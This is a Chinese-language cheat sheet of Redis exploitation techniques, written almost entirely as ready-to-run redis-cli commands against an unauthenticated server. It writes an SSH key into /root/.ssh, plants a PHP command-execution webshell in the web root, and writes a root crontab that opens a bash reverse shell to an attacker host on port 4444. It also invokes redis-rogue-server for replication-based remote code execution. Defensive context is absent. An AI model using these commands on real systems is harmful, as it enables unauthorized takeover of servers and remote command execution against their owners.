# Redis 利用技巧

## 未授权访问检测
```bash
redis-cli -h target -p 6379
redis-cli -h target -p 6379 info
redis-cli -h target -p 6379 CONFIG GET dir
```

## 写 SSH 密钥
```bash
redis-cli -h target config set dir /root/.ssh/
redis-cli -h target config set dbfilename authorized_keys
redis-cli -h target set pubkey "\n\n公钥内容\n\n"
redis-cli -h target save
```

## 写 Webshell
```bash
redis-cli -h target config set dir /var/www/html/
redis-cli -h target config set dbfilename shell.php
redis-cli -h target set web "\n\n<?php system($_GET['cmd']);?>\n\n"
redis-cli -h target save
```

## 写 crontab
```bash
redis-cli -h target config set dir /var/spool/cron/
redis-cli -h target config set dbfilename root
redis-cli -h target set cron "\n\n*/1 * * * * bash -i >& /dev/tcp/vps/4444 0>&1\n\n"
redis-cli -h target save
```

## 主从复制 RCE
```bash
# 利用 redis-rogue-server
python3 redis-rogue-server.py --rhost target --rport 6379 --lhost vps --lport 8888

# 原理：建立主从关系，加载恶意模块
```
